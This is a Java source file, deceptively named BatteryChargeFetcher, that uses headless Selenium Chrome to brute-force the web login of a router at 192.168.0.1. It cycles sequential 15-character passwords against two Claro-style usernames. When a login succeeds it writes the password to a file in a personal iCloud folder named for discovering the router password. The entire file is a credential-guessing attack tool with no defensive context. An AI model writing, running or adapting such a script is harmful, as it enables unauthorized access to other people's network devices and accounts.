package padrao;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.math.BigInteger;
import java.time.Duration;

public class BatteryChargeFetcher {

    private static final String ALL_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
    private static final String[] USERS = {"CLARO_1CFFE9", "CLARO_D6F463"};
    private static final String LOGIN_URL = "http://192.168.0.1/2.0/gui/login";
    private static final int DELAY_MS = 100;
    private static final long FEEDBACK_INTERVAL = 1000;
    private static final int TIMEOUT_SECONDS = 10;
    private static final int PASSWORD_LENGTH = 15;

    public static void main(String[] args) {
        System.setProperty("webdriver.chrome.driver", "/usr/local/bin/chromedriver");
        
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--headless");
        options.addArguments("--disable-dev-shm-usage");
        options.addArguments("--no-sandbox");
        
        WebDriver driver = new ChromeDriver(options);
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(TIMEOUT_SECONDS));
        
        try {
            boolean passwordFound = false;
            BigInteger attempts = BigInteger.ZERO;
            
            for (String user : USERS) {
                if (passwordFound) break;
                
                System.out.println("Tentando usuário: " + user);
                
                // Inicializa o contador de posições
                int[] currentPositions = new int[PASSWORD_LENGTH];
                
                while (!passwordFound) {
                    attempts = attempts.add(BigInteger.ONE);
                    String password = generateSequentialPassword(currentPositions);
                    
                    //if (attempts.mod(BigInteger.valueOf(FEEDBACK_INTERVAL)).equals(BigInteger.ZERO)) {
                        System.out.println("Testando: " + password + " - Tentativa " + attempts);
                    //}
                    
                    try {
                        driver.get(LOGIN_URL);
                        
                        WebElement userField = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("login")));
                        WebElement passField = wait.until(ExpectedConditions.presenceOfElementLocated(By.id("password")));
                        WebElement submitBtn = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector("button.btn-primary")));
                        
                        userField.clear();
                        passField.clear();
                        
                        userField.sendKeys(user);
                        passField.sendKeys(password);
                        submitBtn.click();
                        
                        try {
                            wait.until(d -> !d.getPageSource().contains("Login ou senha inválido(s)"));
                            passwordFound = true;
                            System.out.println("\nSENHA ENCONTRADA!");
                            System.out.println("Usuário: " + user);
                            System.out.println("Senha: " + password);
                            System.out.println("Tentativas: " + attempts);
                            savePassword(user, password, attempts);
                        } catch (Exception e) {
                            // Continua tentando
                        }
                        
                        Thread.sleep(DELAY_MS);
                        
                    } catch (Exception e) {
                        System.err.println("Erro na tentativa " + attempts + ": " + e.getMessage());
                        driver.quit();
                        driver = new ChromeDriver(options);
                        wait = new WebDriverWait(driver, Duration.ofSeconds(TIMEOUT_SECONDS));
                    }
                    
                    // Avança para a próxima senha sequencial
                    incrementPositions(currentPositions);
                }
            }
            
            if (!passwordFound) {
                System.out.println("Execução interrompida após " + attempts + " tentativas.");
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            driver.quit();
        }
    }

    private static String generateSequentialPassword(int[] positions) {
        StringBuilder password = new StringBuilder();
        
        for (int i = 0; i < PASSWORD_LENGTH; i++) {
            password.append(ALL_CHARS.charAt(positions[i] % ALL_CHARS.length()));
        }
        
        return password.toString();
    }
    
    private static void incrementPositions(int[] positions) {
        for (int i = positions.length - 1; i >= 0; i--) {
            positions[i]++;
            
            if (positions[i] < ALL_CHARS.length()) {
                break; // Não precisa carregar para a próxima posição
            }
            
            // Reseta esta posição e carrega 1 para a próxima
            positions[i] = 0;
        }
    }

    private static void savePassword(String user, String password, BigInteger attempts) {
        try {
            String content = String.format(
                "Usuário: %s\nSenha: %s\nTentativas: %s\nData: %s",
                user, password, attempts, java.time.LocalDateTime.now()
            );
            Files.write(
                Paths.get("/Users/brenomedeiros/Library/Mobile Documents/com~apple~CloudDocs/Servidor/descobrirSenhaRoteador/senhaDescoberta.txt"),
                content.getBytes(StandardCharsets.UTF_8)
            );
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}